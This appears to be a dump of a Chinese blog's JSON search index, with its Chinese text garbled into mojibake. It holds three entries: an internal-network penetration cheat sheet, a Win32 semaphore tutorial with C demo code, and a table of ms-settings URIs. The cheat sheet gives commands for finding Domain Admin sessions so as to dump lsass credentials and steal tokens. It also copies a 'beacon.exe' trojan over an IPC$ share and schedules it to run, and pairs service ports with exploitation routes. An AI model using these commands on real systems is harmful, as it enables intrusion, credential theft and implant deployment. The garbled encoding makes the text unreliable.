#æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåçš„æ–‡ä»¶netview.exe -o filename.txt #å°†æ‰€æœ‰è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶netview.exe -d domain æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„åŸŸã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨netview.exe -g group æŒ‡å®šæœç´¢çš„ç»„åã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™åœ¨Domain Adminsç»„ä¸­æœç´¢netview.exe -c å¯¹å·²æ‰¾åˆ°çš„å…±äº«ç›®å½•/æ–‡ä»¶çš„è®¿é—®æƒé™è¿›è¡Œæ£€æŸ¥netview.exe -i interval æšä¸¾ä¸»æœºä¹‹é—´ç­‰å¾…çš„ç§’æ•°netview.exe -j jitter åº”ç”¨äºé—´éš”çš„æŠ–åŠ¨ç™¾åˆ†æ¯”ï¼ˆ0.0-1.0ï¼‰ netview.exe netview æ˜¯ä¸€ä¸ªæšä¸¾å·¥å…·ï¼Œä½¿ç”¨ WinAPI æšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨ NetSessionEnum å¯»æ‰¾ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨ NetShareEnum å¯»æ‰¾å…±äº«ï¼Œåˆ©ç”¨ NetWkstaUserEnum æšä¸¾ç™»å½•çš„ç”¨æˆ·ï¼Œnetview å¯ä»¥æŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ï¼Œå…¶ç»å¤§éƒ¨åˆ†åŠŸèƒ½æ— éœ€ç®¡ç†å‘˜æƒé™å°±å¯ä½¿ç”¨ã€‚ 123456789netview.exe -h #å¸®åŠ©netview.exe -f filename.txt #æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„æ–‡ä»¶netview.exe -e filename.txt #æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåçš„æ–‡ä»¶netview.exe -o filename.txt #å°†æ‰€æœ‰è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶netview.exe -d domain æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„åŸŸã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨netview.exe -g group æŒ‡å®šæœç´¢çš„ç»„åã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™åœ¨Domain Adminsç»„ä¸­æœç´¢netview.exe -c å¯¹å·²æ‰¾åˆ°çš„å…±äº«ç›®å½•/æ–‡ä»¶çš„è®¿é—®æƒé™è¿›è¡Œæ£€æŸ¥netview.exe -i interval æšä¸¾ä¸»æœºä¹‹é—´ç­‰å¾…çš„ç§’æ•°netview.exe -j jitter åº”ç”¨äºé—´éš”çš„æŠ–åŠ¨ç™¾åˆ†æ¯”ï¼ˆ0.0-1.0ï¼‰ Nmap - NSE è„šæœ¬ smb-enum-domains.nse æšä¸¾åŸŸæ§ï¼Œè·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰ smb-enum-users.nse æ‰«æåŸŸæ§ï¼Œè·å–æ›´å¤šçš„åŸŸç”¨æˆ·ä¿¡æ¯ smb-enum-shares.nse éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½• smb-enum-processes.nse å¯¹ä¸»æœºçš„ç³»ç»Ÿè¿›ç¨‹è¿›è¡Œéå†ï¼Œç›®æ ‡ä¸»æœºè¿è¡Œç€å“ªäº›è½¯ä»¶ smb-enum-sessions.nse è·å–åŸŸå†…ä¸»æœºçš„ç”¨æˆ·ç™»é™†ä¼šè¯ï¼ŒæŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»é™†ï¼Œä¸”ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ smb-os-discovery.nse æ”¶é›†ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿã€è®¡ç®—æœºåã€åŸŸåã€åŸŸæ—åç§°ã€NetBIOS æœºå™¨åã€NetBIOS åŸŸåã€å·¥ä½œç»„ã€ç³»ç»Ÿæ—¶é—´ç­‰ä¿¡æ¯ PowerView è„šæœ¬ åŸŸææƒ - å®šä½åŸŸç®¡è¿›ç¨‹ ä»¤ç‰Œçªƒå–ï¼Œä»¥è¾¾åˆ°åŸŸæƒé™æå‡çš„ç›®çš„ï¼Ÿ æ–¹æ³• 1ï¼šä¼šè¯/è¿›ç¨‹æ£€æŸ¥åŸŸç®¡ å®šä½åŸŸç®¡ä¼šè¯ï¼Œæ‹¿ä¸‹æœºå™¨ï¼ŒæŠ“åŸŸç®¡å¯†ç ã€‚ å®šä½åŸŸç®¡è¿›ç¨‹ï¼Œæ‹¿ä¸‹æœºå™¨ï¼Œä»¤ç‰Œçªƒå–ã€‚ 1234567891011121314# å•æœºæŸ¥æ‰¾quser # æŸ¥çœ‹å½“å‰æœºå™¨ä¼šè¯ï¼Œå…³æ³¨æ˜¯å¦æœ‰åŸŸç®¡è´¦æˆ·ï¼Œå¯¼lsass.exeå¿«ç…§ï¼ŒæŠ“æ˜æ–‡tasklist /v # æŸ¥çœ‹è¿›ç¨‹ï¼Œå…³æ³¨è¿›ç¨‹å¯åŠ¨ç”¨æˆ·ï¼Œå¯èƒ½æœ‰åŸŸç®¡ï¼Œä»¤ç‰Œçªƒå–- tasklist /v /fi &quot;USERNAME eq åŸŸå\\åŸŸç®¡å&quot;# æ‰¹é‡æ£€æŸ¥åŸŸç®¡è¿›ç¨‹## å…ˆå¯¼ä¸€ä»½åŸŸç®¡åå•net group &quot;Domain Admins&quot; /domain # æŸ¥åŸŸç®¡## æ”¶é›†çš„å¾…æ£€æŸ¥æœºå™¨ipips.txt## p73 for å¾ªç¯æ‰¹é‡å¯¼è¿œç¨‹æœºå™¨è¿›ç¨‹ï¼Œç„¶åç”¨åŸŸç®¡åå•ç­›é€‰ã€‚tasklist /v /s &lt;ip&gt; /u &lt;user&gt; /p &lt;passwd&gt; # æ ¸å¿ƒå‘½ä»¤ï¼ŒæŸ¥çœ‹è¿œç¨‹æœºå™¨è¿›ç¨‹ï¼Œï¼Ÿï¼Ÿï¼Ÿæ­¤å¤„å­˜ç–‘ï¼Œå½“å‰è´¦æˆ·å¯ä»¥ç™»å…¶å®ƒæœºå™¨ï¼Œä¸å°±æ˜¯åŸŸç®¡ï¼Ÿ æ–¹æ³• 2ï¼šæ‰¹é‡æœç´¢åŸŸæ§ä¸Šçš„åŸŸç”¨æˆ·ä¼šè¯ å®šä½åŸŸç®¡ä¼šè¯ï¼Œæ‹¿ä¸‹æœºå™¨ï¼ŒæŠ“åŸŸç®¡å¯†ç ã€‚ 123456789# 1ã€è·å–ç­›é€‰ä¿¡æ¯net group &quot;Domain Controllers&quot; /domain # æŸ¥åŸŸæ§æœºå™¨ånet group &quot;Domain Admins&quot; /domain # æŸ¥åŸŸç®¡# 2ã€netsess.exe æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨ï¼Œè¿”å›æ´»åŠ¨ä¼šè¯çš„ipã€åŸŸè´¦æˆ·ã€ä¼šè¯æ—¶é—´ã€ä¼šè¯ç©ºé—²æ—¶é—´# 3ã€ç­›é€‰å¾—åˆ°åŸŸæ§ä¸Šçš„åŸŸç”¨æˆ·ä¼šè¯p72 cmd for å‘½ä»¤ Get Domain Adminsï¼ˆGDAï¼‰æ‰¹å¤„ç†è„šæœ¬ä¸€æŠŠé” æ–¹æ³• 3ï¼šæ‰¹é‡æœç´¢è¿œç¨‹æœºå™¨ NetBIOS å®šä½åŸŸç®¡ä¼šè¯ï¼ŒæŸäº›ç‰ˆæœ¬ windows å…è®¸ç”¨æˆ·é€šè¿‡ NetBIOS æŸ¥è¯¢å·²ç™»å½•ç”¨æˆ·ã€‚ 12nbtstat -A &lt;IP&gt;# p73 forå¾ªç¯ 0x04 å†…ç½‘æ¨ªå‘æ€è·¯åŠå¦‚ä½•è·¨ç½‘æ®µ 1ã€æˆ‘æ˜¯è°ã€æˆ‘åœ¨å“ªã€æˆ‘çš„ç›®æ ‡ 2ã€ä¿¡æ¯æ”¶é›† 3ã€æ¨ªå‘ç§»åŠ¨ æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº NetBIOS æ¢æµ‹ï¼š ICMP æ¢æµ‹ï¼šfor in ARP æ‰«æï¼šarp.exeã€Empire - arpscanã€Nishang - Invoke-ARPScan.ps1 TCP/UDP ç«¯å£æ‰«æï¼šnmapã€masscanã€telnetã€MSF - portscan æ¨¡å—ã€Nishang - Invoke-PortScan.ps1ã€PowerSploit - Invoke-portscan.ps1 ICMP æ¢æµ‹ for in 1for /l %i in (1,1,255) do @ ping 172.16.1.%i -w 1 -n 1 | find /i &quot;ttl=&quot; vbs è„šæœ¬ cscript 1.vbs 1p51 ARP æ‰«æ åŠ¨é™æ˜¯å¦ä¼šå¤ªå¤§ã€‚ TCP/UDP ç«¯å£æ‰«æ æ‰¾ç½‘æ®µ #DNS DNS åŒºåŸŸä¼ è¾“æ¼æ´ **DNS åŒºåŸŸä¼ é€ï¼ˆDNS zone transferï¼‰**æ˜¯æŒ‡ä¸€å°å¤‡ç”¨ DNS æœåŠ¡å™¨ä½¿ç”¨æ¥è‡ªä¸» DNS æœåŠ¡å™¨çš„æ•°æ®åˆ·æ–°è‡ªå·±çš„åŸŸï¼ˆzoneï¼‰æ•°æ®åº“ï¼Œä»è€Œé¿å…ä¸» DNS æœåŠ¡å™¨å› æ„å¤–æ•…éšœå½±å“åˆ°æ•´ä¸ªåŸŸåè§£ææœåŠ¡ã€‚ DNS åŒºåŸŸä¼ é€æ–¹å¼ï¼šaxfrï¼šå®Œå…¨åŒºåŸŸä¼ é€ã€ixfrï¼šå¢é‡åŒºåŸŸä¼ é€ DNS åŒºåŸŸä¼ è¾“æ¼æ´ï¼šä¸€èˆ¬æ¥è¯´ DNS åŒºåŸŸä¼ é€åªåœ¨ä¸»å¤‡ DNS æœåŠ¡å™¨é—´ä½¿ç”¨ï¼Œä½†ç”±äºä¸»æœåŠ¡å™¨é”™è¯¯é…ç½®ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·å‘èµ·è¯·æ±‚åå¯è·å¾—ä¸€ä¸ª zone æ•°æ®åº“çš„è¯¦ç»†ä¿¡æ¯ã€‚ ä¿®å¤æ–¹å¼ï¼šæ·»åŠ  allow-transferï¼Œé…ç½® ip ç™½åå• åˆ©ç”¨ #nslookup #nmap 12nslookupls &lt;å®Œæ•´åŸŸå&gt; 1nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=åŸŸå&quot; -Pn -p 53 192.168.101.152 è¿œç¨‹è¿æ¥ 1234567891011121314151617å»ºç«‹IPCè¿æ¥å‘½ä»¤ï¼šnet use \\\\191.168.52.136\\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;æ–­å¼€è¿æ¥ï¼šnet use \\\\x.x.x.x\\ipc$ /delæŸ¥çœ‹è¿æ¥æ˜¯å¦å»ºç«‹ï¼šnet useæµ‹è¯•è¿æ¥ï¼šdir \\\\191.168.52.136\\c$æ‹·è´æœ¨é©¬ï¼šcopy beacon.exe \\\\191.168.52.136\\c$åˆ›å»ºè®¡åˆ’ä»»åŠ¡(at&lt;2012ã€schtasks&gt;=2012)ï¼šat \\\\191.168.52.136 15:47 c:\\beacon.exe ä¸»æœºå ç«¯å£ - é‡ç‚¹å…³æ³¨çš„ç»„ä»¶ æ•°æ®åº“å‡­æ®ï¼šæŠ“ navicat å‡­æ®ã€å¼±å£ä»¤ 1433 sqlserver sa ç”¨æˆ·åˆ©ç”¨ xpcmdshellã€sp_configureã€sp*ææƒ #æ•°æ®åº“/SQLServer 3306 mysql root ç”¨æˆ·åˆ©ç”¨ udf ææƒ #æ•°æ®åº“/MySQL udf ææƒåŸç†è¯¦è§£ - ka1n4t - åšå®¢å›­ 1521 oracle #oracle 6379 redis æœªæˆæƒæ¼æ´åˆ©ç”¨ #Redis 9200 ES æœªæˆæƒ 27017 MongoDB æœªæˆæƒ #MongoDB web åº”ç”¨ - é‡ç‚¹ OAï¼šé€šè¾¾ã€æ³›å¾®ã€å¸†è½¯ é‚®ç®±ï¼šcoremail shiroã€solrã€weblogic é›†æƒç³»ç»Ÿ VCenter ESXI å¤©æ“æœåŠ¡ç«¯ æ·±ä¿¡æœ EDR å ¡å’æœº ä¸»æœºæ¼æ´ 135 Wmihackerã€ShareWmi 445 CS - psexecã€MSF - exploit/windows/smb/ã€IPC è¿æ¥ã€Impacket å·¥å…·åŒ…ï¼ˆpsexecã€smbexecã€wmiexecï¼‰ 3389 RDP CVE-2019-0708 5985 WinRM CS 4.1 æ¯’æ¶² Venom","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ä¿¡æ¯","slug":"ä¿¡æ¯","permalink":"https://hodlyounger.github.io/tags/%E4%BF%A1%E6%81%AF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€winapiã€‘çº¿ç¨‹åŒæ­¥ä¹‹ä¿¡å·é‡ï¼ˆSemaphoresï¼‰","date":"2023-10-27T01:24:02.026Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winapiã€‘çº¿ç¨‹åŒæ­¥ä¹‹ä¿¡å·é‡Seamphorse/","text":"æ¦‚è¿°ï¼š semaphores çš„è¯´æ˜å’Œä½¿ç”¨ å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š Semaphore Objects - Win32 apps | Microsoft Learn Semaphoresæ˜¯è§£å†³å„ç§ producer/consumeré—®é¢˜çš„å…³é”®è¦ç´ ã€‚è¿™ç§é—®é¢˜ä¼šå­˜æœ‰ä¸€ä¸ªç¼“å†²åŒºï¼Œå¯èƒ½åœ¨åŒä¸€æ—¶é—´å†…è¢«è¯»å‡ºæ•°æ®æˆ–è¢«å†™å…¥æ•°æ®ã€‚ ç†è®ºå¯ä»¥è¯æ˜,mutex æ˜¯ semaphore çš„ä¸€ç§é€€åŒ–ã€‚å¦‚æœä½ äº§ç”Ÿä¸€ä¸ªsemaphore å¹¶ä»¤æœ€å¤§å€¼ä¸º1,é‚£å°±æ˜¯ä¸€ä¸ª mutexã€‚ä¹Ÿå› æ­¤, mutexåˆå¸¸è¢«ç§°ä¸ºbinary semaphoreã€‚åœ¨è®¸å¤šç³»ç»Ÿä¸­, semaphores å¸¸è¢«ä½¿ç”¨, å› ä¸º mutexeså¯èƒ½å¹¶ä¸å­˜åœ¨ã€‚åœ¨Win32ä¸­semaphores è¢«ä½¿ç”¨çš„æƒ…å†µå°±å°‘å¾—å¤šï¼Œå› ä¸º mutex å­˜åœ¨çš„ç¼˜æ•…ã€‚ åˆ›å»º semaphore createSemaphoreA å‡½æ•° (winbase.h) - Win32 apps | Microsoft Learn 123456HANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpAttributes, // å®‰å…¨å±æ€§, å¯ä»¥è®¾ç½®NULL LONG lInitialCount, // åˆå§‹å€¼, [0, lMaximumCount] LONG lMaximumCount, // æœ€å¤§å€¼, è¿™ä¹Ÿå°±æ˜¯åœ¨åŒä¸€æ—¶é—´å†…èƒ½å¤Ÿé”ä½semaphoreä¹‹çº¿ç¨‹çš„æœ€å¤šä¸ªæ•° LPCTSTR lpName // åç§°, å…¶ä»–çº¿ç¨‹æˆ–è¿›ç¨‹å¯ä»¥æ ¹æ®åç§°å¼•ç”¨è¯¥ä¿¡å·é‡; NULLåˆ™äº§ç”Ÿæ— åç§°ä¿¡å·é‡); å¦‚æœæˆåŠŸå°±ä¼ å›ä¸€ä¸ªhandle, å¦åˆ™ä¼ å›NULL. ä¸è®ºå“ªä¸€ç§æƒ…å†µ,GetLastError()éƒ½ä¼šä¼ å›ä¸€ä¸ªåˆç†çš„ç»“æœ. å¦‚æœæŒ‡å®šçš„semaphoreåç§°å·²ç»å­˜åœ¨,åˆ™è¯¥å‡½æ•°è¿˜æ˜¯æˆåŠŸçš„, GetLastError()ä¼šä¼ å›ERROR_ALREADY_EXISTS. è·å¾— semaphore é€šè¿‡ä¿¡å·é‡åï¼Œè·å¾—ä¿¡å·é‡å¯¹è±¡å¥æŸ„ OpenSemaphoreW function (synchapi.h) - Win32 apps | Microsoft Learn 12345HANDLE OpenSemaphoreW( [in] DWORD dwDesiredAccess, // è®¿é—®æƒé™ï¼Œä¸€èˆ¬ä¼ å…¥ SEMAPHORE_ALL_ACCESS [in] BOOL bInheritHandle, // ä¿¡å·é‡å¥æŸ„ç»§æ‰¿æ€§ï¼Œä¸€èˆ¬ä¼ å…¥TRUEå³å¯ [in] LPCWSTR lpName // åç§°ï¼Œä¸åŒè¿›ç¨‹ä¸­ä¸ªçº¿ç¨‹å¯ä»¥é€šè¿‡åç§°æ¥ç¡®ä¿å®ƒä»¬è®¿é—®åŒä¸€ä¸ªä¿¡å·é‡); semaphoreçš„ç°å€¼ä»£è¡¨çš„æ„ä¹‰æ˜¯ç›®å‰å¯ç”¨çš„èµ„æºæ•°, å¦‚æœsemaphoreçš„ç°å€¼ä¸º1, è¡¨ç¤ºè¿˜æœ‰ä¸€ä¸ªé”å®šåŠ¨ä½œå¯ä»¥æˆåŠŸ; å¦‚æœç°å€¼ä¸º5, å°±è¡¨ç¤ºè¿˜æœ‰äº”ä¸ªé”å®šåŠ¨ä½œå¯ä»¥æˆåŠŸ. æ¯å½“ä¸€ä¸ªé”å®šåŠ¨ä½œæˆåŠŸ, semaphoreçš„ç°å€¼å°±ä¼šå‡1. ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸€ç§ Wait() å‡½æ•°(ä¾‹å¦‚ WaitForSingleObject() )è¦æ±‚é”å®šä¸€ä¸ªsemaphore. å› æ­¤, å¦‚æœsemaphoreçš„ç°å€¼ä¸ä¸º0, Wait() å‡½æ•°ä¼šç«‹åˆ»è¿”å›. ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åå¤è°ƒç”¨ Wait() å‡½æ•°ä»¥äº§ç”Ÿæ–°çš„é”å®š. è¿™å’Œmutexç»ä¸ç›¸åŒï¼šæ‹¥æœ‰mutexçš„çº¿ç¨‹ä¸è®ºå†è°ƒç”¨å¤šå°‘æ¬¡ Wait() å‡½æ•°, ä¹Ÿä¸ä¼šè¢«é˜»å¡ä½ã€‚ ä¸€æ—¦semaphoreçš„ç°å€¼é™åˆ°0, å°±è¡¨ç¤ºèµ„æºå·²ç»è€—å°½. æ­¤æ—¶, ä»»ä½•çº¿ç¨‹å¦‚æœè°ƒç”¨Waitâ€¦()å‡½æ•°, å¿…ç„¶è¦ç­‰å¾…, ç›´åˆ°æŸä¸ªé”å®šè¢«è§£é™¤ä¸ºæ­¢. è§£é™¤ semaphore é‡Šæ”¾ä¿¡å·é‡ ReleaseSemaphore function (synchapi.h) - Win32 apps | Microsoft Learn æ³¨ï¼šä¼ å…¥çš„å¥æŸ„å¿…é¡»æœ‰ SEMAPHORE_MODIFY_STATE æƒé™ï¼Œå‚è€ƒ åŒæ­¥å¯¹è±¡å®‰å…¨æ€§å’Œè®¿é—®æƒé™ - Win32 apps | Microsoft Learn 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // ä¿¡å·é‡çš„å¥æŸ„ [in] LONG lReleaseCount, // è¡¨ç¤ºå¢åŠ ä¸ªæ•°ï¼Œå¿…é¡»å¤§äº0ä¸”ä¸è¶…è¿‡æœ€å¤§èµ„æºæ•°é‡ [out, optional] LPLONG lpPreviousCount // å¯ä»¥ç”¨æ¥ä¼ å‡ºå…ˆå‰çš„èµ„æºè®¡æ•°ï¼Œè®¾ä¸ºNULLè¡¨ç¤ºä¸éœ€è¦ä¼ å‡º); ReleaseSemaphoreå‡½æ•°ä¼šè§¦å‘WaitForSingleObjectå‡½æ•°ã€‚ReleaseSemaphoreå‡½æ•°ç”¨äºé‡Šæ”¾ä¸€ä¸ªä¿¡å·é‡å¯¹è±¡çš„è®¡æ•°ï¼Œè€ŒWaitForSingleObjectå‡½æ•°ç”¨äºç­‰å¾…ä¸€ä¸ªä¿¡å·é‡å¯¹è±¡çš„è®¡æ•°ã€‚å½“ReleaseSemaphoreå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šå°†ä¿¡å·é‡å¯¹è±¡çš„è®¡æ•°å¢åŠ ï¼Œå¹¶ä¸”å¦‚æœæœ‰ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨ç­‰å¾…è¿™ä¸ªä¿¡å·é‡å¯¹è±¡çš„è®¡æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°±ä¼šè¢«å”¤é†’ã€‚å› æ­¤ï¼ŒReleaseSemaphoreå‡½æ•°ä¼šè§¦å‘WaitForSingleObjectå‡½æ•°ã€‚ è¡¥å……è¯´æ˜ ä¸ºä»€ä¹ˆ semaphore è¦æœ‰ä¸€ä¸ªåˆå€¼ CreateSemaphore()çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯lInitialCount, å®ƒçš„å­˜åœ¨ç†ç”±å’ŒCreateMutex()çš„bInitialOwnerå‚æ•°çš„å­˜åœ¨ç†ç”±æ˜¯ä¸€æ ·çš„. å¦‚æœä½ æŠŠåˆå€¼è®¾å®šä¸º0, ä½ çš„çº¿ç¨‹å°±å¯ä»¥åœ¨äº§ç”Ÿsemaphoreä¹‹åè¿›è¡Œæ‰€æœ‰å¿…è¦çš„åˆå§‹åŒ–å·¥ä½œ. å¾…åˆå§‹åŒ–å·¥ä½œå®Œæˆå, è°ƒç”¨ ReleaseSemaphore()å°±å¯ä»¥æŠŠç°å€¼å¢åŠ åˆ°å…¶æœ€å¤§å¯èƒ½å€¼. Demo å¤šçº¿ç¨‹åŒæ­¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt; #include &lt;process.h&gt; #include &lt;windows.h&gt; long g_nNum;unsigned int __stdcall Fun(void* pPM);const int THREAD_NUM = 10;//ä¿¡å·é‡ä¸å…³é”®æ®µ HANDLE g_hThreadParameter;CRITICAL_SECTION g_csThreadCode;int main()&#123; printf(&quot; ç»å…¸çº¿ç¨‹åŒæ­¥ ä¿¡å·é‡Semaphore\\n&quot;); printf(&quot; -- by MoreWindows( http://blog.csdn.net/MoreWindows ) --\\n\\n&quot;); //åˆå§‹åŒ–ä¿¡å·é‡å’Œå…³é”®æ®µ g_hThreadParameter = CreateSemaphore(NULL, 0, 1, NULL);//å½“å‰0ä¸ªèµ„æºï¼Œæœ€å¤§å…è®¸1ä¸ªåŒæ—¶è®¿é—® InitializeCriticalSection(&amp;g_csThreadCode); HANDLE handle[THREAD_NUM]; g_nNum = 0; int i = 0; while (i &lt; THREAD_NUM) &#123; handle[i] = (HANDLE)_beginthreadex(NULL, 0, Fun, &amp;i, 0, NULL); WaitForSingleObject(g_hThreadParameter, INFINITE);//ç­‰å¾…ä¿¡å·é‡&gt;0 ++i; &#125; WaitForMultipleObjects(THREAD_NUM, handle, TRUE, INFINITE); //é”€æ¯ä¿¡å·é‡å’Œå…³é”®æ®µ DeleteCriticalSection(&amp;g_csThreadCode); CloseHandle(g_hThreadParameter); for (i = 0; i &lt; THREAD_NUM; i++) CloseHandle(handle[i]); return 0;&#125;unsigned int __stdcall Fun(void* pPM)&#123; int nThreadNum = *(int*)pPM; ReleaseSemaphore(g_hThreadParameter, 1, NULL);//ä¿¡å·é‡++ Sleep(50);//some work should to do EnterCriticalSection(&amp;g_csThreadCode); ++g_nNum; Sleep(0);//some work should to do printf(&quot;çº¿ç¨‹ç¼–å·ä¸º%d å…¨å±€èµ„æºå€¼ä¸º%d\\n&quot;, nThreadNum, g_nNum); LeaveCriticalSection(&amp;g_csThreadCode); return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"semaphores","slug":"semaphores","permalink":"https://hodlyounger.github.io/tags/semaphores/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€Windowsã€‘Win 10/11 é€šè¿‡å‘½ä»¤è¡Œæ‰“å¼€ç³»ç»Ÿè®¾ç½®é¡µé¢","date":"2023-10-27T01:24:02.025Z","path":"A_OS/Windows/API/ã€winapiã€‘å‘½ä»¤è¡Œæ‰“å¼€ç³»ç»Ÿè®¾ç½®é¡µ/","text":"æ¦‚è¿°: ç¨‹åºä¸­æˆ–è€…è„šæœ¬ä¸­è¦æ‰“å¼€ç³»ç»Ÿè®¾ç½®ç•Œé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å’Œæ¥å£ [toc] ä½¿ç”¨ Win32 API 1::ShellExecute(hWnd, &quot;open&quot;, &quot;ms-settings:about&quot;, ...); KeyBoard Win+Rå¯åŠ¨å‘½ä»¤è¡Œ Win+R åœ¨è¾“å…¥æ¡†ç›´æ¥è¾“å…¥å¯åŠ¨çš„ç•Œé¢å‘½ä»¤å³å¯ã€‚ Command Line(cmd.exe) 1start ms-settings:about å¯åŠ¨è¯´æ˜å¯¹ç…§è¡¨ Settings page Uri / Setting Name Category About (device name/specification) ms-settings:about Windows Access work or school ms-settings:workplace Network Account info (share between apps) ms-settings:privacy-accountinfo Privacy Activation ms-settings:activation Security Activity history (build 17040+) ms-settings:privacy-activityhistory Privacy Adaptive Color Filters Link ms-settings:easeofaccess-colorfilter-adaptivecolorlink Accessibility Airplane mode (wireless/bluetooth) ms-settings:network-airplanemode Network Airplane mode (wireless/bluetooth) ms-settings:proximity Network App diagnostics (share between apps) ms-settings:privacy-appdiagnostics Privacy App volume and device preferences (1903) ms-settings:apps-volume Audio Apps &amp; features ms-settings:appsfeatures Apps Apps for websites ms-settings:appsforwebsites Apps AutoPlay ms-settings:autoplay Apps Automatic online file downloads ms-settings:privacy-automaticfiledownloads Apps Background apps ms-settings:privacy-backgroundapps Apps Backgrounds ms-settings:personalization-background Customisation Backup ms-settings:backup Storage Battery Saver ms-settings:batterysaver Power Battery Saver - settings ms-settings:batterysaver-settings Power Battery Saver - usage ms-settings:batterysaver-usagedetails Power Bluetooth &amp; Connected Devices ms-settings:bluetooth Network Bluetooth &amp; Connected Devices ms-settings:connecteddevices Network Calendar (share between apps) ms-settings:privacy-calendar Privacy Call history (share between apps) ms-settings:privacy-callhistory Privacy Cellular Network ms-settings:network-cellular Network Clipboard ms-settings:clipboard Apps Closed Captioning ms-settings:easeofaccess-closedcaptioning Accessibility Color Filters (build 17025+) ms-settings:easeofaccess-colorfilter Accessibility Colors ms-settings:personalization-colors ms-settings:colors Customisation Connect to a wireless display ms-settings-connectabledevices:devicediscovery Display Contacts (share between apps) ms-settings:privacy-contacts Privacy Cortana ms-settings:cortana Search Cortana more details ms-settings:cortana-moredetails Search Cortana permissions ms-settings:cortana-permissions Search Data Sense ms-settings:datausage Storage Date &amp; Time ms-settings:dateandtime Region &amp; Language Default Save Locations ms-settings:savelocations Storage Default apps ms-settings:defaultapps Apps Delivery Optimization ms-settings:delivery-optimization Windows Device Encryption (where available) ms-settings:deviceencryption Security Dial-up Network ms-settings:network-dialup Network DirectAccess ms-settings:network-directaccess Network Display ms-settings:display Display Display Screen rotation ms-settings:screenrotation Display Display Text scaling (build 17025+) ms-settings:easeofaccess-display Accessibility Document Library (share between apps) ms-settings:privacy-documents Privacy Download maps ms-settings:maps-downloadmaps Apps Dynamic Lock ms-settings:signinoptions-dynamiclock Security Ease of Access Audio (build 17035+) ms-settings:easeofaccess-audio Accessibility Edge web browser microsoft-edge:url Apps Email &amp; app accounts ms-settings:emailandaccounts Security Email (share between apps) ms-settings:privacy-email Privacy Ethernet Network ms-settings:network-ethernet Network Eye Control (build 17035+) ms-settings:easeofaccess-eyecontrol Accessibility Eye tracker (requires eyetracker hardware) ms-settings:privacy-eyetracker Privacy Family &amp; other users ms-settings:family-group Security Family &amp; other users ms-settings:otherusers Security Feedback &amp; diagnostics (privacy) ms-settings:privacy-feedback Security File System (share between apps) ms-settings:privacy-broadfilesystemaccess Privacy Find My Device ms-settings:findmydevice Security Focus assist (build 17074+) ms-settings:quiethoursOR ms-settings:quietmomentshome Apps Fonts (build 17083+) ms-settings:fonts Customisation For developers ms-settings:developers Apps Graphics Advanced scaling settings ms-settings:display-advanced Display Graphics performance preference ms-settings:display-advancedgraphics Display High Contrast ms-settings:easeofaccess-highcontrast Accessibility Home page for Settings ms-settings: Windows Keyboard 